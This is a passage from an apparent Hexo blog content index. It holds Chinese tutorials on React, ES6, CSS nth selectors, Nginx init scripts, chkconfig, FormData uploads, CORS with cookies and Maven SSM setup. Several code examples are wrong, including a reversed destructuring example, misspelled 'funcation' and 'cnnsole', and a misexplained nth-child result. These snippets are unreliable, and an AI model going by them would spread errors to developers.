&quot;react-icons&#x2F;fa&#x2F;eye&quot;;import FaLapTop from &quot;react-icons&#x2F;fa&#x2F;laptop&quot;;import FaBook from &quot;react-icons&#x2F;fa&#x2F;book&quot;;import FaCogs from &quot;react-icons&#x2F;fa&#x2F;cogs&quot;;&#x2F;&#x2F;把从React Icon导入的Component作为data里的&quot;icon&quot;变量导入const datas &#x3D; [ &#123;&quot;title&quot;: &quot;首页&quot;, &quot;icon&quot;: FaEye&#125;, &#123;&quot;title&quot;: &quot;漏洞&quot;, &quot;icon&quot;: FaLapTop&#125;, &#123;&quot;title&quot;: &quot;用户&quot;, &quot;icon&quot;: FaBook&#125;, &#123;&quot;title&quot;: &quot;平台&quot;, &quot;icon&quot;: FaCogs&#125;,];&#x2F;&#x2F;通过map循环创建menusclass SideBar extends Component &#123; render() &#123; let menus &#x3D; datas.map((data) &#x3D;&gt; &lt;Menu data&#x3D;&#123;data&#125; key&#x3D;&#123;data.title&#125;&#x2F;&gt;); return ( &lt;div&gt; &lt;ul&gt; &#123;menus&#125; &lt;&#x2F;ul&gt; &lt;&#x2F;div&gt; ); &#125;&#125;&#x2F;&#x2F;通过Menu里动态创建子Componentclass Menu extends Component &#123; render() &#123; return ( &lt;li&gt; &lt;a&gt; &#123;React.createElement(this.props.data.icon)&#125; &lt;span&gt;&#123;this.props.data.title&#125;&lt;&#x2F;span&gt; &lt;&#x2F;a&gt; &lt;&#x2F;li&gt; ) &#125;&#125; 用到的知识点 JSX中使用大括号转入JavaScript解析 使用了React的createElement方法动态创建JSX的Element，让子Component生效","tags":[{"name":"FrontEnd","slug":"FrontEnd","permalink":"http://yoursite.com/tags/FrontEnd/"},{"name":"React","slug":"React","permalink":"http://yoursite.com/tags/React/"}]},{"title":"ES6文内件多个Clss时WebStorm不能自动补全","date":"2016-12-03T02:00:00.000Z","path":"2016/12/03/ES6文内件多个Clss时WebStorm不能自动补全/","text":"一个文件多个Class在写JSX的时候经常会有这个需求，一个Component中有多个子Component都写在一个文件里 虽然有时候页面可以正常运行，但是 WebStorm却不会对其自动补全 1234567891011121314151617import FaBars from &quot;react-icons&#x2F;fa&#x2F;bars&quot;;class Header extends Component &#123; render() &#123; return ( &lt;div className&#x3D;&#123;style.root&#125;&gt; &lt;FaBars &#x2F;&gt; &lt;&#x3D;&#x3D;此处可以进行自动补全 &lt;TitleBox &#x2F;&gt; &lt;&#x3D;&#x3D;此处不会自动补全 &lt;UserBox &#x2F;&gt; &lt;&#x3D;&#x3D;此处不会自动补全 &lt;&#x2F;div&gt; ) &#125;&#125;class TitleBox extends Component &#123;...&#125;class UserBox extends Component &#123;...&#125; 搞得我很困惑，为了让其能自动补全，我发现可以通过大括号强行让其按JavaScript解析而不是JSX 123456789101112&#x2F;&#x2F;妥协的解决方案class Header extends Component &#123; render() &#123; return ( &lt;div className&#x3D;&#123;style.root&#125;&gt; &lt;FaBars &#x2F;&gt; &lt;&#x3D;&#x3D;此处可以进行自动补全 &#123;&lt;TitleBox &#x2F;&gt;&#125; &lt;&#x3D;&#x3D;使用大括号进入JS作用域 &#123;&lt;UserBox &#x2F;&gt;&#125; &lt;&#x3D;&#x3D;可以完成正常的自动补全 &lt;&#x2F;div&gt; ) &#125;&#125; 正确的解决方案后来满满了解了ES6之后，才发现是变量作用域的问题啊。。。。class是个变量，需要声明后才能被WebStorm自动补全 1234567891011121314151617import FaBars from &quot;react-icons&#x2F;fa&#x2F;bars&quot;;class TitleBox extends Component &#123;...&#125;class Header extends Component &#123; render() &#123; return ( &lt;div className&#x3D;&#123;style.root&#125;&gt; &lt;FaBars &#x2F;&gt; &lt;&#x3D;&#x3D;因为import的FaBars在class Header以上 &lt;TitleBox &#x2F;&gt; &lt;&#x3D;&#x3D;此处可以进行自动补全同FaBars &#123;&lt;UserBox &#x2F;&gt;&#125; &lt;&#x3D;&#x3D;此处还是不会自动补全 &lt;&#x2F;div&gt; ) &#125;&#125;class UserBox extends Component &#123;...&#125; 问题的核心分析其实在写代码中不管怎么写都可以运行，但是这里牵扯到了两个知识点值得注意 一个文件多个class虽然是没有作用域的，但是如果相对class执行函数则是有的，参考文章Redux进行多个Connect WebStorm进行分析的时候采用了作用域的分析，仅仅是这个IDE的代码分析逻辑的问题 妥协的解决方式，其实是在JSX中采用大括号强行转入JS代码，就如同{style.root}一样","tags":[{"name":"FrontEnd","slug":"FrontEnd","permalink":"http://yoursite.com/tags/FrontEnd/"},{"name":"React","slug":"React","permalink":"http://yoursite.com/tags/React/"}]},{"title":"ES6使用目录路径import","date":"2016-12-03T01:00:00.000Z","path":"2016/12/03/ES6使用目录路径import/","text":"ES6使用目录路径import除了对具体文件进行导出外，还可以对文件夹进行导出，但是需要index文件，存在目录 123--component --file.jsx --index.jsx 其中index文件中写入 12&#x2F;&#x2F;index.jsxexport Custom from &quot;.&#x2F;file.jsx&quot;; 就可以在其它文件中，直接对component文件夹进行导入 12&#x2F;&#x2F;此处component是个文件夹，会自动读取index文件import &#123;Custom&#125; from &quot;..&#x2F;..&#x2F;component&quot;","tags":[{"name":"FrontEnd","slug":"FrontEnd","permalink":"http://yoursite.com/tags/FrontEnd/"},{"name":"React","slug":"React","permalink":"http://yoursite.com/tags/React/"}]},{"title":"ES6的Object的is和assign用法","date":"2016-12-03T00:00:00.000Z","path":"2016/12/03/ES6的Object的is和assign用法/","text":"对象的扩展在ES6中有两个Object的扩展用法 Object.is()用于判断两个对象是否相等，ES6提出“Same-value equality”（同值相等）算法，用来解决这个问题。Object.is就是部署这个算法的新方法。它用来比较两个值是否严格相等，与严格比较运算符（===）的行为基本一致 123Object.is(&#39;foo&#39;, &#39;foo&#39;) &#x2F;&#x2F; trueObject.is(&#123;&#125;, &#123;&#125;) &#x2F;&#x2F; false Object.assign()用于合并对象，当做对数据的更新逻辑时，功能类似于Java里的Dozer库 12345678var target &#x3D; &#123; a: 1 &#125;;var source1 &#x3D; &#123; b: 2 &#125;;var source2 &#x3D; &#123; c: 3 &#125;;Object.assign(target, source1, source2);target &#x2F;&#x2F; &#123;a:1, b:2, c:3&#125; 该方法有个特性，如果目标对象与源对象有同名属性，或多个源对象有同名属性，则后面的属性会覆盖前面的属性，那么我们就可以用来对对象做更新操作 12345var source &#x3D; &#123;key:&quot;1&quot;&#125;var update &#x3D; &#123;key:&quot;10&quot;&#125;source &#x3D; Object.assign(&#123;&#125;,source,update)console.log(source) &#x2F;&#x2F;&#123;key:&quot;10&quot;&#125; 这里我们把target设定成一个空对象，在完成了assgin之后返回target，由于需要update的信息在source之后，所以update的数据覆盖了元数据，又将source对象重新指向返回的target完成更新","tags":[{"name":"FrontEnd","slug":"FrontEnd","permalink":"http://yoursite.com/tags/FrontEnd/"},{"name":"React","slug":"React","permalink":"http://yoursite.com/tags/React/"}]},{"title":"React简要必备知识点","date":"2016-12-02T23:00:00.000Z","path":"2016/12/03/React简要必备知识点/","text":"React入门React的入门文章一大堆,我也就不絮絮叨叨的讲了，请参考阮一峰React系列的文章 本文只对一些教程中没有提到的，忽略了初学者的困惑的技术点进行补充。 正确理解JSX在React的文件里，编程时可能会出现3种样式的语言，但是这3种样式都属于JavaScript分别是 语言样式 代表词 解释 CommonJS require、ReactDOM.render、React.createClass 这个是node默认支持的JS的写法 ES6 import、export、extends 这是ECMAScript 6的简称，是JavaScript写法的一个变种，类似CoffeeScript JSX 在render的返回值里 JSX是Facebook为了React提出一种解析语言，仅仅在render的返回值里 1234567891011121314151617&#x2F;&#x2F;CommonJSvar component &#x3D; React.createClass(&#123; render: function() &#123; return ( &lt;p&gt;这是CommonJS的写法&lt;&#x2F;p&gt; ) &#125;&#125;);&#x2F;&#x2F;ES6class component extends React.Component &#123; render() &#123; return ( &lt;p&gt;这是ECMAScript 6的写法&lt;&#x2F;p&gt; ) &#125;&#125; 不管使用哪种写法，在render里的 return()内部才是JSX的部分 一种看上去像HTML实际是JavaScript的语言格式， 如果想在JSX内部嵌套使用JavaScript的变量，需要加入大括号 123return ( &lt;p&gt;外部是JSX&#123;大括号内部才是正常的JavaScript&#125;外部是JSX&lt;&#x2F;p&gt; ) ES常用知识点详细的ES教程请参考阮一峰的ES6教程 ES6的变量作用域ES6中变量定义有3种方式var、const、let，其中let存在严格的作用域概念，必须先声明后使用，而const和var则和传统JavaScript的一样，由此引发了很多疑问 同一文件中Class嵌套WebStorm自动补全失效 Redux在文件中Connect多个class时注意作用域 ES6的解构赋值ES6存在一种赋值方法叫解构赋值 12345678var name &#x3D; &quot;Li&quot;var number &#x3D; &quot;001&quot;&#123;name, number&#125; &#x3D; student &#x2F;&#x2F;进行解构赋值console.log(student.name)&#x2F;&#x2F; &quot;Li&quot;console.log(student.number)&#x2F;&#x2F; &quot;001&quot; ES6的import/exportES6中对模块的链接使用的是import和export关键词，类似于其它语言中的include和import一样，但是稍微有些不同的是，ES6可以export多个文件 123456&#x2F;&#x2F;file.jsxexport default ...export value1export value2 当我使用import加载上述文件的时候 12import custom from &quot;file.jsx&quot; &#x2F;&#x2F;使用custom作为名字加载default的exportimport &#123;value1,value2&#125; from &quot;file.jsx&quot;&#x2F;&#x2F;加载value1和value2两个export 参考文章对目录进行import可以直接从目录导入 ES6的Arrow FunctionES6中有一个常用的语法糖叫做 Arrow Function 1const example &#x3D; param &#x3D;&gt; value 这句话准确的描述是: 定义了一个example的const变量，变量指向一个匿名方法的方法，方法带有一个参数param，方法内部直接返回value 用传统的JS来写就是 123456var example &#x3D; funcation(param) &#123; return value;&#125;console.log(example)&#x2F;&#x2F; 打印方法 &quot;funcation(param) &#123;return value&#125;&quot;console.log(example())&#x2F;&#x2F; 打印方法执行结果 &quot;value&quot; 除了以上之外箭头函数还可以使用小括号来包裹多个参数，和大括号执行多条语句而不是直接返回 1234const example &#x3D; （param1，param2） &#x3D;&gt; &#123; console.log(&quot;执行第一条语句&quot;) cnnsole.log(&quot;执行第二条语句&quot;)&#125; 从上文可以看出，大括号是可以不进行return的，小括号还可以用来包裹直接返回的Object对象，例如以下两种是等价的 1234567&#x2F;&#x2F;使用小括号直接返回对象const example1 &#x3D; (param1,param2) &#x3D;&gt; (&#123;key:&quot;value&quot;&#125;)&#x2F;&#x2F;使用语句手动返回对象const example2 &#x3D; (param1,param2) &#x3D;&gt; &#123; return &#123;key:&quot;value&quot;&#125;&#125;","tags":[{"name":"FrontEnd","slug":"FrontEnd","permalink":"http://yoursite.com/tags/FrontEnd/"},{"name":"React","slug":"React","permalink":"http://yoursite.com/tags/React/"}]},{"title":"CSS大于号选择第一级子元素","date":"2016-12-02T00:00:00.000Z","path":"2016/12/02/大于号选择器选择第一级子元素/","text":"element &gt;在CSS中大于号表示为子选择器(Child Selector) 而两个元素并列 div p 对应于JQuery中的Children()方法，只会返回第一级子元素 12345678&lt;body&gt; &lt;div id&#x3D;&quot;one&quot;&gt; &lt;div id&#x3D;&quot;three&quot;&gt; &lt;&#x2F;div&gt; &lt;&#x2F;div&gt; &lt;div id&#x3D;&quot;two&quot;&gt; &lt;&#x2F;div&gt;&lt;&#x2F;body&gt; 如果我采用 1body div:first-child 来选取会得到 one 和 three 虽然first-child限定了div必须为第一个子元素，但是three本身不仅为one的子元素，也是body的子元素，只是不是第一级 甚至采用 1body div:nth-child(1) 也是仅仅限制了第一个子元素，而不是第一级的第一个子元素 所以应该采用 1body &gt;div:first-child 才能正确选择到one，使用大于号限定在body下的 第一级子元素中选择第一个子元素","tags":[{"name":"JavaScript","slug":"JavaScript","permalink":"http://yoursite.com/tags/JavaScript/"},{"name":"FrontEnd","slug":"FrontEnd","permalink":"http://yoursite.com/tags/FrontEnd/"},{"name":"CSS","slug":"CSS","permalink":"http://yoursite.com/tags/CSS/"}]},{"title":"NTH选择器选择单双行","date":"2016-12-01T23:00:00.000Z","path":"2016/12/02/CSS选择器选择单双行/","text":"通过nth-of-type选择单双行其中odd意思是奇数，even意思是偶数 12345678910p:nth-of-type(odd)&#123;background:#ff0000;&#125;p:nth-of-type(even)&#123;background:#0000ff;&#125; CSS3的nth选择器上述用到的是CSS3里的nth选择，其一共分为四个，而nth代表什么意思。。。我没有查到。。fuck。。。 选择器 示例 解释 :nth-child(n) p:nth-child(2) 选择每个p元素是其父级的第二个子元素 :nth-last-child(n) p:nth-last-child(2) 选择每个p元素的是其父级的第二个子元素，从最后一个向前计数 :nth-of-type(n) p:nth-of-type(2) 选择每个p元素是其父级的第二个p元素 :nth-last-of-type(n) p:nth-last-of-type(2) 选择每个p元素的是其父级的第二个p元素，从最后一个向前计数 可以看出 除了last这个关键字可以改变计数方向以外 还有 child 和 type 两种选择方式 child和type的区别通过百度我们得知 ele:nth-child(n)是指父元素下第n个元素且这个元素为ele，若不是，则选择失败 ele:nth-of-type(n)是指父元素下第n个ele元素 1234567&lt;div&gt; &lt;ul&gt; &lt;p&gt;aaaa&lt;&#x2F;p&gt; &lt;li&gt;bbbb&lt;&#x2F;li&gt; &lt;li&gt;cccc&lt;&#x2F;li&gt; &lt;&#x2F;ul&gt;&lt;&#x2F;div&gt; ul li:nth-child(2) : 选择的是aaaa节点 ul li:nth-of-type(2): 选择的是bbbb节点 通过ab+b选择nth选择器除了使用数字之外，还可以使用循环公式 an+b ,例如 1ele:nth-child(3n+4) 会去匹配第 4, 7, 10, 13 个元素","tags":[{"name":"JavaScript","slug":"JavaScript","permalink":"http://yoursite.com/tags/JavaScript/"},{"name":"FrontEnd","slug":"FrontEnd","permalink":"http://yoursite.com/tags/FrontEnd/"},{"name":"CSS","slug":"CSS","permalink":"http://yoursite.com/tags/CSS/"}]},{"title":"Nginx和Jetty在开机自启动","date":"2016-12-01T02:00:00.000Z","path":"2016/12/01/Nginx和Jetty在开机自启动/","text":"开机自启动参考文章Linux开机自启动的脚本，我们需要准备可以用的Nginx和Jetty脚本 Nginx的脚本Nginx的脚本可以从Nginx官网推荐脚本下载到,下好后需要更改两处 12345&#x2F;&#x2F;指定本机的Nginx的Home路径nginx&#x3D;&quot;&#x2F;usr&#x2F;local&#x2F;nginx&#x2F;sbin&#x2F;nginx&quot;&#x2F;&#x2F;指定本机的Nginx配置文件NGINX_CONF_FILE&#x3D;&quot;&#x2F;usr&#x2F;local&#x2F;nginx&#x2F;conf&#x2F;nginx.conf&quot; Jetty的脚本Jetty的脚本可以去Jetty服务器的bin目录下拷贝 jetty.sh 脚本，然后在其中添加 1JETTY_HOME&#x3D;&quot;&#x2F;usr&#x2F;local&#x2F;jetty&#x2F;&quot; 来指定本机的Jetty的Home路径 Nginx脚本附件修改后的官网脚本 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132#!&#x2F;bin&#x2F;sh## https:&#x2F;&#x2F;www.nginx.com&#x2F;resources&#x2F;wiki&#x2F;start&#x2F;topics&#x2F;examples&#x2F;redhatnginxinit&#x2F;# nginx - this script starts and stops the nginx daemon## chkconfig: - 85 15# description: NGINX is an HTTP(S) server, HTTP(S) reverse \\# proxy and IMAP&#x2F;POP3 proxy server# processname: nginx# config: &#x2F;etc&#x2F;nginx&#x2F;nginx.conf# config: &#x2F;etc&#x2F;sysconfig&#x2F;nginx# pidfile: &#x2F;var&#x2F;run&#x2F;nginx.pid# Source function library.. &#x2F;etc&#x2F;rc.d&#x2F;init.d&#x2F;functions# Source networking configuration.. &#x2F;etc&#x2F;sysconfig&#x2F;network# Check that networking is up.[ &quot;$NETWORKING&quot; &#x3D; &quot;no&quot; ] &amp;&amp; exit 0nginx&#x3D;&quot;&#x2F;usr&#x2F;local&#x2F;nginx&#x2F;sbin&#x2F;nginx&quot;prog&#x3D;$(basename $nginx)NGINX_CONF_FILE&#x3D;&quot;&#x2F;usr&#x2F;local&#x2F;nginx&#x2F;conf&#x2F;nginx.conf&quot;[ -f &#x2F;etc&#x2F;sysconfig&#x2F;nginx ] &amp;&amp; . &#x2F;etc&#x2F;sysconfig&#x2F;nginxlockfile&#x3D;&#x2F;var&#x2F;lock&#x2F;subsys&#x2F;nginxmake_dirs() &#123; # make required directories user&#x3D;&#96;$nginx -V 2&gt;&amp;1 | grep &quot;configure arguments:.*--user&#x3D;&quot; | sed &#39;s&#x2F;[^*]*--user&#x3D;\\([^ ]*\\).*&#x2F;\\1&#x2F;g&#39; -&#96; if [ -n &quot;$user&quot; ]; then if [ -z &quot;&#96;grep $user &#x2F;etc&#x2F;passwd&#96;&quot; ]; then useradd -M -s &#x2F;bin&#x2F;nologin $user fi options&#x3D;&#96;$nginx -V 2&gt;&amp;1 | grep &#39;configure arguments:&#39;&#96; for opt in $options; do if [ &#96;echo $opt | grep &#39;.*-temp-path&#39;&#96; ]; then value&#x3D;&#96;echo $opt | cut -d &quot;&#x3D;&quot; -f 2&#96; if [ ! -d &quot;$value&quot; ]; then # echo &quot;creating&quot; $value mkdir -p $value &amp;&amp; chown -R $user $value fi fi done fi&#125;start() &#123; [ -x $nginx ] || exit 5 [ -f $NGINX_CONF_FILE ] || exit 6 make_dirs echo -n $&quot;Starting $prog: &quot; daemon $nginx -c $NGINX_CONF_FILE retval&#x3D;$? echo [ $retval -eq 0 ] &amp;&amp; touch $lockfile return $retval&#125;stop() &#123; echo -n $&quot;Stopping $prog: &quot; killproc $prog -QUIT retval&#x3D;$? echo [ $retval -eq 0 ] &amp;&amp; rm -f $lockfile return $retval&#125;restart() &#123; configtest || return $? stop sleep 1 start&#125;reload() &#123; configtest || return $? echo -n $&quot;Reloading $prog: &quot; killproc $nginx -HUP RETVAL&#x3D;$? echo&#125;force_reload() &#123; restart&#125;configtest() &#123; $nginx -t -c $NGINX_CONF_FILE&#125;rh_status() &#123; status $prog&#125;rh_status_q() &#123; rh_status &gt;&#x2F;dev&#x2F;null 2&gt;&amp;1&#125;case &quot;$1&quot; in start) rh_status_q &amp;&amp; exit 0 $1 ;; stop) rh_status_q || exit 0 $1 ;; restart|configtest) $1 ;; reload) rh_status_q || exit 7 $1 ;; force-reload) force_reload ;; status) rh_status ;; condrestart|try-restart) rh_status_q || exit 0 ;; *) echo $&quot;Usage: $0 &#123;start|stop|status|restart|condrestart|try-restart|reload|force-reload|configtest&#125;&quot; exit 2esac","tags":[{"name":"Shell","slug":"Shell","permalink":"http://yoursite.com/tags/Shell/"},{"name":"Linux","slug":"Linux","permalink":"http://yoursite.com/tags/Linux/"},{"name":"Nginx","slug":"Nginx","permalink":"http://yoursite.com/tags/Nginx/"}]},{"title":"Linux设置开机自启动脚本","date":"2016-12-01T01:00:00.000Z","path":"2016/12/01/Linux设置开机自启动脚本/","text":"控制开机自启动的命令负责开机服务的程序是chkconfig ,其实该命令管控了整个计算机的生命周期，并不仅仅是开机时刻 12&#x2F;&#x2F;查看有哪些开机执行的服务[root@localhost &#x2F;]# chkconfig --list 生命周期分为7个等级，包括 等级0表示：表示关机 等级1表示：单用户模式 等级2表示：无网络连接的多用户命令行模式 等级3表示：有网络连接的多用户命令行模式 等级4表示：不可用 等级5表示：带图形界面的多用户模式 等级6表示：重新启动 准备一个符合chkconfig的脚本如果想准备一个可以被chkconfig调用的脚本需要在文件头包含以下两行 “#!/bin/sh” : 代表该文件是个可以被sh执行的脚本 “chkconfig: - 85 15”: 代表该文件的chkconfig配置，横线代表默认等级345，第一个数字代表启动顺序优先级，第二个数字代表关闭优先级，都是数字越小优先级越高 123#!&#x2F;bin&#x2F;sh## chkconfig: - 85 15 脚本必须包括至少start 和 stop两套命令,其中 $0 代表shellname本身 $1 代表chkconfig执行shellname的第一个参数 因为chkconfig会在0-6的等级中默认采用 start 和 stop 参数来执行shellname，在目录 /etc/rc.d 中可以看到0-6的文件夹，具体细节请参考Linux详细教程 1234567891011case &quot;$1&quot; in start) ...... ;; stop) ...... ;; *) echo $&quot;Usage: $0 &#123;start|stop&#125;&quot; exit 2esac 把脚本移动到指定目录在加入chkconfig服务之前，需要将脚本移动到目录 /etc/init.d/ 然后需要 给予脚本执行权限 12345&#x2F;&#x2F;移动文件[root@localhost &#x2F;]# mv shellname &#x2F;etc&#x2F;init.d&#x2F;shellname&#x2F;&#x2F;给予权限[root@localhost &#x2F;]# chmod 755 &#x2F;etc&#x2F;init.d&#x2F;shellname 加入chkconfig 服务在加入chkconfig服务器后，可以在任意位置使用 service shellname command来执行 12345678&#x2F;&#x2F;把自定义的shellname脚本加入chkconfig服务[root@localhost &#x2F;]# chkconfig --add shellname&#x2F;&#x2F;开启默认等级的chkconfig服务[root@localhost &#x2F;]# chkconfig shellname on&#x2F;&#x2F;开启指定等级的chkconfig服务[root@localhost &#x2F;]# chkconfig --level 2345 shellname on 在加入了chkconfig服务之后可以这样调用 1[root@localhost &#x2F;]# service shellname start 写一个正确的shell脚本shell脚本有自己的一套语法，比如switch…case… 就看着挺奇怪，注意不要瞎用[] 和 () 括号，代表什么内部命令，折腾了我好久。。。具体怎么写你自己看吧","tags":[{"name":"Shell","slug":"Shell","permalink":"http://yoursite.com/tags/Shell/"},{"name":"Linux","slug":"Linux","permalink":"http://yoursite.com/tags/Linux/"}]},{"title":"使用FormData对象打包参数和上传文件","date":"2016-12-01T00:00:00.000Z","path":"2016/12/01/使用FormData对象打包参数/","text":"FormData对象FormData是H5新增的一个HTML对象，可以用JS代码来传输 Content-type:multipart/form-data 的对象 初始化通常有两种初始化方式 1234&#x2F;&#x2F;新建一个空的Form对象var form1 &#x3D; new FormData();&#x2F;&#x2F;通过读取一个已经存在的Form标签来新建对象var form2 &#x3D; new FormData(document.getElementById(&quot;formId&quot;)); 添加变量可以使用append/get方法来进行字段的添加和删除 1234&#x2F;&#x2F;添加某个名为key的字段form1.append(&quot;key&quot;,&quot;value&quot;);&#x2F;&#x2F;取出文件添加入file字段form1.append(&quot;file&quot;,$(&#39;#file&#39;).files[0]); 注意files函数返回的是一个文件数组，注意取出对象 获得变量值FormData对象内的参数是私有的，无法通过打点调用，需要通过get函数来读取，但是貌似Safari不支持，Chrome支持 1234&#x2F;&#x2F;错误的方式var key1 &#x3D; form1.key&#x2F;&#x2F;正确的方式var key2 &#x3D; form1.get(&quot;key&quot;) 发送Ajax在发送Ajax的时候，由于FormData本身已经设定了Content-type所以JQuery的Ajax需要设定一些参数 12345678 $.ajax(&quot;url&quot;, &#123; type: &#39;POST&#39;, data: form1, processData: false, &#x2F;&#x2F;不对数据进行处理 contentType: false &#x2F;&#x2F;不对Content-type进行处理 &#125;).done(function(res) &#123; &#125;).fail(function(res) &#123;&#125;); 后台的处理出了要发送订制过的Ajax之外，也需要在后台开启multipart/form-data的数据绑定和接收，以Java为例，参考HTTP的参数绑定","tags":[{"name":"JavaScript","slug":"JavaScript","permalink":"http://yoursite.com/tags/JavaScript/"},{"name":"FrontEnd","slug":"FrontEnd","permalink":"http://yoursite.com/tags/FrontEnd/"},{"name":"Ajax","slug":"Ajax","permalink":"http://yoursite.com/tags/Ajax/"}]},{"title":"服务器跨域的访问和Session","date":"2016-11-30T23:00:00.000Z","path":"2016/12/01/服务器跨域的访问和Session/","text":"服务器跨域主流浏览器Chrome Edge FireFox Safari都会有域的保护，域(Domin)指的就是域名，关于域的知识请参考同源策略相关文章 如果出现了跨域，HTTP请求会提示错误 1XMLHttpRequest cannot load http:&#x2F;&#x2F;localhost:8080&#x2F;all. No &#39;Access-Control-Allow-Origin&#39; header is present on the requested resource. Origin &#39;null&#39; is therefore not allowed access. 提示 Access-Control-Allow-Origin 是null所以不允许接入，该字段是HTTP的一个Header字段 通常需要由服务器设定在返回报文中 对Response对象进行操作第一种方法可以手动在返回方法的HttpServletResponse对象中手动设置 其中星号代表任意地址 12345678910public static void setJSONResponse(HttpServletResponse response) &#123; try &#123; response.setContentType(&quot;application&#x2F;json;charset&#x3D;UTF-8&quot;); response.setHeader(&quot;Access-Control-Allow-Origin&quot;, &quot;*&quot;); .... &#125; catch (IOException e) &#123; .... &#125;&#125; 使用Servlet过滤器统一添加写一个跨域请求过滤器 123456789101112131415161718192021public class CrossDominFilter implements Filter &#123; @Override public void init(FilterConfig filterConfig) throws ServletException &#123; &#125; @Override public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) throws IOException, ServletException &#123; ((HttpServletResponse) response).addHeader( &quot;Access-Control-Allow-Origin&quot;, &quot;*&quot; ); chain.doFilter(request, response); &#125; @Override public void destroy() &#123; &#125;&#125; 在web.xml对Servlet添加过滤器 123456789&lt;!--跨域开启过滤器--&gt;&lt;filter&gt; &lt;filter-name&gt;crossDominFilter&lt;&#x2F;filter-name&gt; &lt;filter-class&gt;com.company.web.CrossDominFilter&lt;&#x2F;filter-class&gt;&lt;&#x2F;filter&gt;&lt;filter-mapping&gt; &lt;filter-name&gt;crossDominFilter&lt;&#x2F;filter-name&gt; &lt;url-pattern&gt;&#x2F;*&lt;&#x2F;url-pattern&gt;&lt;&#x2F;filter-mapping&gt; 跨域请求Set-Cookie和Cookie方法失效在跨域请求中另一个问题，由于host不同，跨域请求无法触发服务器容器的Set-Cookie和Cookie机制，导致在登录时无法通过Session/Cookie机制验证是否是同一个用户的请求，需要服务器端和客户端同时修改才能完成该机制 服务器端修改在验证可信后对跨域请求后进行Set-Cookie Access-Control-Allow-Credentials 接受跨域请求携带的Cookie，在使用该字段的时候 Allow-Origin 不能为星号，必须为确定的值。指的注意的是 Allow-Origin 仅能设定一个值，如果想要设定多个则需要用Nginx进行处理，不能直接在Java中添加多个。 12345678910111213141516171819202122232425public class CrossDominFilter implements Filter &#123; @Override public void init(FilterConfig filterConfig) throws ServletException &#123; &#125; @Override public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) throws IOException, ServletException &#123; ((HttpServletResponse) response).addHeader( &quot;Access-Control-Allow-Origin&quot;, &quot;http:&#x2F;&#x2F;localhost:63342&quot; ); ((HttpServletResponse) response).addHeader( &quot;Access-Control-Allow-Credentials&quot;, &quot;true&quot; ); chain.doFilter(request, response); &#125; @Override public void destroy() &#123; &#125;&#125; 有些文章中还包含一个字段 Access-Control-Allow-Headers 这个字段并不是必须的，仅当预请求中包含Access-Control-Request-Headers时，是必须包含的，这是对预请求当中Access-Control-Request-Headers的回复，和上面一样是以逗号分隔的列表，可以返回所有支持的头部。 浏览器客户端发送才有可信凭证的Ajax请求，其中 xhrFields: {withCredentials: true} 是必须的，而crossDomain: true则不是，会带着Cookie去服务器。 123456789$.ajax(Constant.LOGIN_SIGN_IN, &#123; type: &quot;POST&quot;, data: &#123;verifycode:test&#125;, success: function (response) &#123; .... &#125;, crossDomain: true, xhrFields: &#123;withCredentials: true&#125;&#125;); 跨域的数据安全性跨域机制仅仅是浏览器的一种本地保护机制，在简单Ajax跨域中，在服务器未添加 Access-Control-Allow-Origin 时并不是代表着服务器未返回数据，而是浏览器没有接收，如果使用BurpSuit等工具截获Response报文，手动加入，则浏览器一样可以正常显示","tags":[{"name":"Java","slug":"Java","permalink":"http://yoursite.com/tags/Java/"},{"name":"Ajax","slug":"Ajax","permalink":"http://yoursite.com/tags/Ajax/"},{"name":"Session","slug":"Session","permalink":"http://yoursite.com/tags/Session/"},{"name":"Cookie","slug":"Cookie","permalink":"http://yoursite.com/tags/Cookie/"}]},{"title":"从空Pom文件用最少依赖配置SSM框架","date":"2016-10-31T20:00:00.000Z","path":"2016/11/01/从空Pom文件用最少依赖配置SSM框架/","text":"从头开始好多Web开发者都没有从头开始部署过SSM框架，网上一些教程总是加了一堆 常用但不是必须 的配置 本文旨在最少配置和依赖的情况下，构建起一个基于SpringMVC+Spring+MyBatis的Maven工程。 基于Maven的Web工程当我们新建一个空的Maven工程的时候，仅有一个pom文件，一个source目录，一个resource目录，参考Java工程目录文章 加入Web目录此时我们要使得这个工程变成Web工程，所以在source和resource同级的地方加入webapp目录 123456---main ---java ---resource ---webapp---WEB-INF ---web.xml 其中根据文章Web.xml是什么可知，WEB-INF 和 web.xml 是由J2EE工程规定的，不能随意更改，web.xml是Servlet的配置，如何从头开始写呢？应该使用哪个版本呢？ 这个可以去你下载的Servlet服务器容器的 /etc 目录中找到 webdefault.xml 该文件的xml命名空间里说明了该版本容器支持哪个版本的Servlet 例如Jetty8支持的是Servlet2.5 而 Jetty9则是3.0,此时我们得到了两个空的配置文件pom.xml和web.xml 空配置文件pom.xml 123456789101112&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;&lt;project xmlns&#x3D;&quot;http:&#x2F;&#x2F;maven.apache.org&#x2F;POM&#x2F;4.0.0&quot; xmlns:xsi&#x3D;&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;2001&#x2F;XMLSchema-instance&quot; xsi:schemaLocation&#x3D;&quot;http:&#x2F;&#x2F;maven.apache.org&#x2F;POM&#x2F;4.0.0 http:&#x2F;&#x2F;maven.apache.org&#x2F;xsd&#x2F;maven-4.0.0.xsd&quot;&gt; &lt;modelVersion&gt;4.0.0&lt;&#x2F;modelVersion&gt; &lt;groupId&gt;person.test&lt;&#x2F;groupId&gt; &lt;artifactId&gt;spring&lt;&#x2F;artifactId&gt; &lt;version&gt;1.0&lt;&#x2F;version&gt;&lt;&#x2F;project&gt; web.xml 12345678910&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;&lt;web-app xmlns&#x3D;&quot;http:&#x2F;&#x2F;xmlns.jcp.org&#x2F;xml&#x2F;ns&#x2F;javaee&quot; xmlns:xsi&#x3D;&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;2001&#x2F;XMLSchema-instance&quot; xsi:schemaLocation&#x3D;&quot;http:&#x2F;&#x2F;xmlns.jcp.org&#x2F;xml&#x2F;ns&#x2F;javaeehttp:&#x2F;&#x2F;xmlns.jcp.org&#x2F;xml&#x2F;ns&#x2F;javaee&#x2F;web-app_3_1.xsd&quot; 